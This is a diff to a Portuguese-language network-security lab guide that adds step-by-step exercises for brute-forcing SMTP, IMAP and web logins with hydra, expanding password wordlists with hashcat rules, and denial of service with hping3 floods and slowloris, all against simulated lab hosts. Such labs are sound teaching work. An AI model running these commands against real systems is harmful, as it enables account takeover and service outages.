@@ -454,11 +454,317 @@ Observe que o host 172.16.40.1 é listado como vulnerável ao ataque. De fato, e
 
 ## Atividade 3 - Ataques de brute-force
 
-TODO
+Ataques de brute-force são ataques contra o mecanismo de autenticação em que o atacante executa diversas testes de autenticação para obter credenciais válidas na "força bruta", ou seja, na tentativa e erro. Os testes de autenticação podem ser baseados em um conjunto de usuários e senhas candidados (também conhecido como *wordlist* ou ataque de dicionário) ou podem ser baseados em valores (pseudo-)aleatórios (exemplo: senha120, senha121, senha122, senha123, ...) -- dizemos pseudo-aleatórios pois o processo de geração de valores pode ser melhorado com heurísticas que aumentam as chances de sucesso. Os ataques de brute-force podem ainda ter como alvo sistemas online ou ainda hashes de senhas que vazaram e, eventualmente, pode ser quebrabas (para obter a entrada que gerou o hash). Nesta atividade vamos mostrar ataques de brute-force contra sistemas online.
+
+### 3.1 Download de dicionários e regras de geração de senhas
+
+O primeiro passo é fazer o download de um dicionário de usuários (logins) e senhas para aumentar a efetividade do ataque. Nesta atividade disponibilizamos dicionários curtos para realização da prática.
+
+O primeiro passo é fazer o download dos dicionários. Para isso, acesso o terminal do Mininet-Sec a partir do Dashboard HackInSDN:
+
+![abrir mininet-sec terminal](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/abrir-mnsec-terminal.png)
+
+Em seguida, no terminal do Mininet-Sec, execute os seguintes comandos:
+```
+cd /tmp
+curl -LO https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/wordlist-password.txt
+curl -LO https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/wordlist-login.txt
+```
+
+Ainda no terminal do Mininet-Sec, faça também o download de um arquivo de regras para geração de senhas que são muito úteis para expandir o dicionário com combinações tipicamente adotadas pelos usuários:
+```
+cd /tmp
+curl -LO https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/refs/heads/master/OneRuleToRuleThemAll.rule
+```
+
+### 3.2 Ataques de força-bruta contra o SMTP e IMAP
+
+Nesta atividade, realzaremos ataques de força bruta contra os mecanismos de autenticação dos serviços SMTP e IMAP. 
+
+Para visualizar o ataque de força bruta ocorrendo, abra o terminal do host srv102 e execute o seguinte comnado para monitorar o log das aplicações:
+```
+tail -f /tmp/mnsec/srv102/log/smtp.log
+```
+
+O comando acima irá exibir mensagens de log relacionadas a falhas de login.
+
+De volta ao terminal do Mininet-sec, vamos utilizar o aplicativo **mnsecx** (mininet-sec exec) para executar comandos em nós específicos da topologia. Por exemplo, para executar o ataque de brute-force a partir do host h401, execute o seguinte comando no Terminal do Mininet-Sec:
+```
+mnsecx h401 hydra -I -L /tmp/wordlist-login.txt -P /tmp/wordlist-password.txt smtp://172.16.10.2/CLEAR
+```
+
+O comando acima inicializará um ataque de força bruta contra o serviço IMAP que está em execução no srv102 (172.16.10.2). Após executar o ataque você deve visualizar uma saída como mostrado abaixo:
+```
+root@mininet-sec-637b0d4f77fb4f-dc67c9b77-f2x6p:/src/mnsec# mnsecx h401 hydra -I -L /tmp/wordlist-login.txt -P /tmp/wordlist-password.txt smtp://172.16.10.2/PLAIN
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-29 07:52:15
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 315 login tries (l:15/p:21), ~20 tries per task
+[DATA] attacking smtp://172.16.10.2:25/PLAIN
+[25][smtp] host: 172.16.10.2   login: teste   password: hackinsdn
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-29 07:52:20
+```
+
+No terminal do srv102, pare a execução do tail com o comando CTRL+C e visualize as tentativas de conexão:
+```
+root@srv102:~# tail -f /tmp/mnsec/srv102/log/smtp.log
+...
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "hackinsdn", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50540", "status": "success", "timestamp": "2024-10-29T07:52:17.149453", "username": "teste"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "password", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50598", "status": "failed", "timestamp": "2024-10-29T07:52:17.159672", "username": "guest"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "123456", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50568", "status": "failed", "timestamp": "2024-10-29T07:52:17.170760", "username": "guest"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "teste123", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50588", "status": "failed", "timestamp": "2024-10-29T07:52:17.171292", "username": "guest"}
+{"action": "login", "dest_ip": "0.0.0.0", "dest_port": "25", "password": "abc123", "server": "smtp_server", "src_ip": "192.168.40.1", "src_port": "50592", "status": "failed", "timestamp": "2024-10-29T07:52:17.171531", "username": "guest"}
+...
+^C
+```
+
+Observe que o hydra reporta ter encontrado uma combinação válida de credenciais: usuário "teste" e senha "hackinsdn". Isso ocorre pois propositalmente configuramos o serviço SMTP em execuçãio no srv102 para aceitar estas credenciais, e os dicioários utilizamos continham combinações que casaram com essa configuração.
+
+Vamos realizar agora um novo ataque de força-bruta, porém dessa vez contra o serviço IMAP. Nesse testes utilizamos o software Dovecot, que provê suporte aos serviços de IMAP e POP3 com TLS e diferentes mecanismos de autenticação. Por padrão, a autenticação do Dovecot é baseada nos usuários locais do Linux, portanto o primeiro passo é criar uma conta local que será alvo do ataque.
+
+No terminal do srv102, crie uma conta local para o usuário "admin" (essa conta será criada sem um shell válido):
+```
+useradd -m -s /bin/false admin
+echo "admin:Hackinsdn123!" | chpasswd
+```
+
+Observe que a senha utilizada agora possui algumas características de segurança, como uso de letras maiúsculas e minúsculas, números e caracteres especiais.
+
+O próximo passo é iniciar o serviço Dovecot. Ainda no terminal do srv102, execute os seguintes comandos para iniciar o Dovecot e verificar seu funcionamento:
+```
+service-mnsec-dovecot.sh srv102 --start
+netstat -lnptu
+```
+
+Após executar o comando acima, o Dovecot será iniciado e estará apto a tratar requisições do protocolo IMAP e POP3 sem SSL (portas 143 e 110) e com SSL (993 e 995). A saída esperada para o comando acima é mostrado abaixo:
+```
+root@srv102:~# service-mnsec-dovecot.sh srv102 --start
+root@srv102:~# netstat -lnptu
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      45042/dovecot       
+tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      45042/dovecot       
+tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      45042/dovecot       
+tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      45042/dovecot       
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1360/python3        
+tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      43761/python3       
+tcp6       0      0 :::993                  :::*                    LISTEN      45042/dovecot       
+tcp6       0      0 :::995                  :::*                    LISTEN      45042/dovecot       
+tcp6       0      0 :::110                  :::*                    LISTEN      45042/dovecot       
+tcp6       0      0 :::143                  :::*                    LISTEN      45042/dovecot       
+```
+
+Agora vamos abrir o terminal do host h401 e executar novamente o hydra para realizar o ataque de brute-force no serviço IMAP, desta vez vamos fixar o login simulando um ataque direcionado:
+```
+hydra -I -l admin -P /tmp/wordlist-password.txt imap://172.16.10.2/PLAIN
+```
+
+Ao executar o comando acima você deverá observar uma série de erros retornados pelo hydra. A saída esperada é ilustrada abaixo:
+```
+root@h401:~# hydra -I -l admin -P /tmp/wordlist-password.txt imap://172.16.10.2/PLAIN
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-29 08:35:22
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:1/p:21), ~2 tries per task
+[DATA] attacking imap://172.16.10.2:143/PLAIN
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+...
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+[ERROR] IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled.
+
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-29 08:35:24
+```
+
+A mensagem de erro listada acima (`IMAP PLAIN AUTH : 2 NO [PRIVACYREQUIRED] Plaintext authentication disabled`) indica que os mecanismos de autenticação estão desativados quando a conexão não possui criptografia TLS/SSL (boa prática!). Portanto, temos duas opções na execução do hydra: 1) executar um STARTTLS para transformar a conexão IMAP em uma conexão segura, ou executar o Hydra na porta do IMAPS (993). Vamos executar o Hydra com STARTTLS:
+```
+hydra -I -l admin -P /tmp/wordlist-password.txt imap://172.16.10.2/TLS:PLAIN
+```
+
+Observe que nenhum erro adicional foi reportado, porém o hydra não identificou credenciais válidas:
+```
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:1/p:21), ~2 tries per task
+[DATA] attacking imap://172.16.10.2:143/TLS:PLAIN
+1 of 1 target completed, 0 valid password found
+```
+
+Isso ocorre pois o dicionário de senhas utilizado não contém a senha do usuário (bom sinal!). Na próxima atividade vamos experimentar algumas técnicas adicionais que podem ser aplicadas nesse cenário.
+
+> [!TIP]  
+> Execute o tcpdump no host srv102 (`tcpdump -i srv102-eth0 -n -vv`) para visualizar os pacotes recebidos e confirmar o uso de TLS/SSL na conexão.
+
+### 3.3 - Ataque de brute-force com senhas geradas dinamicamente
+
+Nesta atividade vamos experimentar dois métodos que podem ser utilizados em ataques de força bruta para expandir o conjunto de senhas usadas no ataque: a) geração de senhas a partir de conjunto de caracteres; e b) mutação do dicionário de senhas a partir de combinações diversas.
+
+No Mininet-Sec, abra o Terminal do host srv103. No terminal do host srv103, execute o seguinte comando para iniciar o serviço HTTP com apache2:
+```
+service-mnsec-apach2.sh srv103 --start --login admin --pass adm123
+```
+
+O comando acima inicializará o Apache2 para prover o serviço web nos protocolos HTTP e HTTPS com um site que possui URLs protegidas por autenticação HTTP Basic e outras URLs protegidas por autenticação baseada em formulários HTML (muito comum em sites na Internet). Observe que a senha que configuramos acima (`adm123`), apesar de simples, não consta no dicionário que utilizamos anteriormente.
+
+Antes de realizar o ataque de força bruta em si, vamos testar manualmente o acesso à página utilizando a ferramenta curl. No terminal do host h401, execute o seguinte comando:
+```
+curl http://172.16.10.3/admin/
+```
+
+Observe que a saída do comando acima retorna uma página HTML com mensagem de erro de acesso não autorizado (`401 Unauthorized`).
+
+Vamos repetir o teste porém agora fornecendo as credenciais de acesso:
+```
+curl -u admin:adm123 http://172.16.10.3/admin/
+```
+
+A saída esperada demonstra o uso correto das credenciais:
+```
+root@h401:~# curl -u admin:adm123 http://172.16.10.3/admin/
+<h1>Welcome to admin page (http basic)</h1>
+```
+
+Executaremos agora o ataque de força bruta. Vamos inicialmente utilizar o hydra para tentar quebrar a senha utilizando o método de geração de senhas a partir de um conjunto de caracteres. No terminal do host h401 execute o seguinte comando:
+```
+hydra -I -V -l admin -x 6:6:aA1 https-get://172.16.10.3/admin/
+```
+
+Ao executar o comando acima, o Hydra retorna um erro (_definition for password bruteforce (-x) generates more than 4 billion passwords, it is just not feasible to try so many attempts_) informando que o conjunto de caracteres escolhido gera muitas combinações, tornando o ataque computacionalmente infactível de realizar. No comando acima combinamos letras minúsculas (`a`), maiúsculas (`A`) e números (`1`). Vamos reduzir o conjutno de caracteres para combinar apenas letras minúsculas e números. Repita o comando acima porém agora com uma modificação:
+```
+hydra -I -V -l admin -x 6:6:a1 https-get://172.16.10.3/admin/
+```
+
+Você pode acompanhar o ataque no host srv103 através dos logs `apache2/access.log` e `apache2/error.log`, conforme ilustrado abaixo:
+```
+root@srv103:~# tail apache2/access.log 
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+192.168.40.1 - admin [29/Dec/2024:09:10:27 +0000] "GET /admin/ HTTP/1.1" 401 693 "-" "Mozilla/4.0 (Hydra)"
+root@srv103:~# tail apache2/error.log 
+[Sun Dec 29 09:10:27.745656 2024] [auth_basic:error] [pid 46417:tid 46441] [client 192.168.40.1:53960] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.756304 2024] [auth_basic:error] [pid 46416:tid 46419] [client 192.168.40.1:53962] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.765881 2024] [auth_basic:error] [pid 46417:tid 46426] [client 192.168.40.1:53976] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.765995 2024] [auth_basic:error] [pid 46416:tid 46440] [client 192.168.40.1:53980] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.766036 2024] [auth_basic:error] [pid 46417:tid 46469] [client 192.168.40.1:53978] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.776285 2024] [auth_basic:error] [pid 46417:tid 46458] [client 192.168.40.1:53984] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.776409 2024] [auth_basic:error] [pid 46416:tid 46449] [client 192.168.40.1:53996] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.786688 2024] [auth_basic:error] [pid 46416:tid 46468] [client 192.168.40.1:54008] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.796642 2024] [auth_basic:error] [pid 46416:tid 46455] [client 192.168.40.1:54010] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+[Sun Dec 29 09:10:27.807040 2024] [auth_basic:error] [pid 46417:tid 46439] [client 192.168.40.1:54018] AH01617: user admin: authentication failure for "/admin/": Password Mismatch
+```
+
+Aguarde alguns minutos e verifique se o Hydra conseguiu identificar alguma credencial válida. No terminal do host h401, pare a execução do Hydra com o comando CTRL+C. Observe que diversas tentativas foram enviadas para o servidor porém nenhuma com sucesso, e diversas outras tentativas ainda estão pendentes. Esse tipo de ataque pode gerar muito ruído na rede (exemplo: logs de falha) e facilmente ser bloqueado.
+
+Vamos realizar um novo ataque de força bruta em uma página web, porém agora contra um site cujo login ocorre através de formulários HTML (cenário bastante comum). Como fizemos anteriormente, primeio vamos fazer o acesso manualmente e em seguida executar o ataque.
+
+A partir do host h401, faça uma requisição ao site protegido por autenticação baseada em formulário HTML:
+```
+curl -k https://172.16.10.3/auth/
+```
+
+Observe na saída HTML que a página requer autenticação através de um formulário HTML, cujas credenciais devem ser fornecidas pelo usuário através dos campos `username` e `password`. Vamos simular um usuário fornecendo as credenciais corretas através do curl.
+
+No terminal do h401, execute:
+```
+curl -k https://172.16.10.3/auth/ -X POST -d "username=admin&password=adm123"
+```
+
+A mensagem de saída indica o sucesso na autenticação (`Welcome admin!`).
+
+Vamos repetir o ataque de força-bruta anterior, porém agora contra o mecanismo de autenticação baseado em formulário HTML. No terminal do h401, execute:
+```
+hydra -I -V -l admin -P /tmp/wordlist-password.txt "https-form-post://172.16.10.1/auth/:username=^USER^&password=^PASS^:Invalid"
+```
+
+Observe que o alvo do ataque no comando acima é composto por 4 partes relacionadas, a saber: 1) o método do ataque (`https-form-post`), ou seja, o protocolo a ser utilizado será https e o método de ataque será formulário html através de uma requisição HTTP POST; 2) a URL de login na qual o formulário html será submetido (`//172.16.10.1/auth/`); 3) o nome dos campos de entrada do formulário relacionados ao login e senha (`:username=^USER^&password=^PASS^` onde `^USER^` e `^PASS^` serão substituídos pelos valores informados no Hydra nos parâmetros `-l/-L` e `-p/-P` respectivamente); 4) finalmente uma string que identifica uma situação de falha de login (`Invalid`) -- permitindo ao Hydra identificar quando a tentativa teve sucesso ou falha.
+
+Em todos os casos acima, bem como no ataque de força bruta contra o serviço de IMAP, o Hydra falhou para identificar credenciais válidas, pois ou os dicionários utilizados não continham a senha de interesse, ou o método de geração de senha mostrou-se computacionalmente infactível. Em seguida, vamos estudar um outro mecanismo de ataque de brute-force que pode ajudar nesses casos. Trata-se dos esquemas de mutação de dicionário, que visam expandir a lista de palavras com modificações tipicamente adotadas pelos usuários (exemplo: a partir de uma palavra base, transformar certos caracteres em maiúsculo ou adicionar números ou adicionar caracteres especiais, enfim).
+
+Para essa atividade utilizaremos regras de mutação apresentadas no seguinte artigo: https://www.notsosecure.com/one-rule-to-rule-them-all/. A ferramenta `hashcat` permite utilizar regras dese tipo para expandir um dicionário de senhas, bem como outros mecanismos de mutação (exemplo: combinar as próprias palavras do dicionário entre si -- ou de múltiplos dicionários, combinar as palavras do dicionário com máscaras de substring aleatórias, entre outras). 
+
+Utilizando as regras do blog citado anteriormente (cujo download já realizamos no passo 3.1), execute o seguinte comando no host h401:
+```
+hashcat -r /tmp/OneRuleToRuleThemAll.rule --stdout /tmp/wordlist-password.txt > /tmp/mutated
+```
+
+> [!TIP]  
+> A instalação padrão do hashcat já inclui algumas regras de mutação de dicionários no diretório `/usr/share/hashcat/rules`.
+
+Em seguida, vamos checar se as senhas que buscamos estão no dicionário expandido:
+```
+grep -w -n "Hackinsdn123!" /tmp/mutated
+grep -w -n "adm123" /tmp/mutated
+```
+
+Como pode observar, ambas as senhas estão no dicionário expandido. O parâmetro `-n` no grep mostra o número da linha na qual a string foi encontrada, o que ajuda a entender quantas tentativas seriam mais ou menos necessárias para o Hydra obter sucesso. No entanto, você pode utilizar também técnicas de reordenação aleatória do arquivo para aumentar a chances de encontrar as credenciais válidas mais cedo.
+
+> [!IMPORTANT]  
+> Como previnir tais ataques de força bruta na autenticação dos serviços de rede ilustrados anteriormente?
+<textarea name="resposta_brute_force" rows="6" cols="80" placeholder="Escreva sua resposta aqui...">
+</textarea>
 
 ## Atividade 4 - Ataques de negação de serviço
 
-TODO
+Nesta atividade mostraremos dois tipos de ataque de negação de serviço: exaustão de recursos por consumo de banda e ataques do tipo Slow HTTP. Os ataques de negação de serviço por consumo de banda são os mais comuns atualmente, tipicamente ocorrendo de forma distribuída e alcançando volumetria de tráfego cada vez mais impressionantes. Por outro lado, os ataques do tipo Slow HTTP são ataques mais especializados e "silenciosos", que visam gerar requisições bem lentamente para o servidor web, mantendo-o ocupado e impossibilitado de tratar requisições legítimas (afetando servidores web que tratam requisições a partir de um pool de threads, por exemplo).
+
+No cenário deste laboratório, o ataque volumétrico afetará o servidor web srv501, que possui um link de apenas 10Mb - sujeito a exaustão de recursos. Já o ataque de Slow HTTP terá como alvo o servidor srv101 - que executa o Apache e pode ser alvo do ataque.
+
+### 4.1 Negação de serviço por consumo de banda
+
+Para monitorar os impactos do ataque, vamos iniciar um cliente legítimo e monitorar pelo tempo de resposta da página (consideraremos um timeout de 1s antes de considerar a página inacessível). Para isso, no terminal do host h101, execute:
+```
+ali -t 1s -d 0 http://172.16.50.1
+```
+
+Após abrir a ferramenta "ali", pressione ENTER para iniciar o monitoramento, conforme ilustrado abaixo:
+
+![ali on h101](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/ali-h101.png)
+
+Observe que todas as requisições estão retornando código 200, e o tempo de resposta médio gira em torno de 1.6ms com valor máximo de pouco mais de 3 milisegundos.
+
+Em seguida, a partir do terminal do Secflood1 execute o seguinte ataque de negação de serviço:
+```
+hping3 --udp -p 53 -d 1000 --flood 172.16.50.1
+```
+
+Volte ao gráfico do host h101 e observe que imediatamente o tempo de resposta subiu para 1s (valor máximo de timeout configurado) e muitas requisições agora retornam erro de tempo máximo de resposta estourado. O gráfico abaixo ilustra tal comportamento:
+
+![hping secflood](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/flood-http.png)
+
+Pare o ataque pressionando CTRL+C no terminal do Secflood1. Volte ao gráfico do host h101 e observe imediatamente o tempo de resposta é normalizado.
+
+No host h101, pare o "ali" pressionando a tecla "q". 
+
+### 4.2 Negação de serviço do tipo Slow HTTP
+
+Os ataques do tipo Slow HTTP consistem no envio de requisições HTTP bem lentamente para manter o servidor ocupado e inapto a tratar requisições legítimas. O ataque de _Slowloris_ possui exatamente este modus operandi, consistindo basicamente em um cliente que sobrecarrega um servidor alvo com requisições simultâneas de abertura e manutenção da conexão. Nesta atividade, utilizaremos como alvo o servidor srv103 (lembre-se que iniciamos o Apache2 no host srv103 na Atividade 3.3).
+
+Novamente vamos executar o aplicativo "ali" para monitorar os impactos do ataque, simulando um usuário legítimo. Para isso, execute o seguinte comando no host srv101:
+```
+ali -t 1s -d 0 http://172.16.10.3
+```
+
+Após abrir a ferramenta "ali", pressione ENTER para iniciar o monitoramento.
+
+Em seguida, a partir do terminal do Secflood1 execute o seguinte ataque de negação de serviço:
+```
+slowloris -p 80 -s 300 172.16.10.3
+```
+
+Volte ao gráfico do host h101 e observe que imediatamente o tempo de resposta subiu para 1s (valor máximo de timeout configurado) e muitas requisições agora retornam erro de tempo máximo de resposta estourado. O gráfico abaixo ilustra tal comportamento:
+
+![slowloris](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab01-scan-brute_force-dos/images/slowloris.png)
+
+Feche o gráfico do "ali", pressionando a tecla "q". 
 
 ## Atividade 5 - Detecção e contenção de ataques de varredura
 
